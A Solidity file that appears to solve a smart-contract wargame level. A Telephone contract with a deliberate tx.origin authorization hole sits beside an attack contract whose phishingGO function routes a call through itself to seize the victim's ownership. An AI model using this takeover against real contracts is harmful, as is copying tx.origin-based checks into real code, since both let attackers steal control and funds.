// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/math/SafeMath.sol" ;

contract Telephone {

  address public owner;

  constructor() public {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}

contract III237HackTelephone{
    Telephone phone;
    
    function phishingGO(address _victim) public{
         phone = Telephone(_victim);
         phone.changeOwner(msg.sender);
    }
}
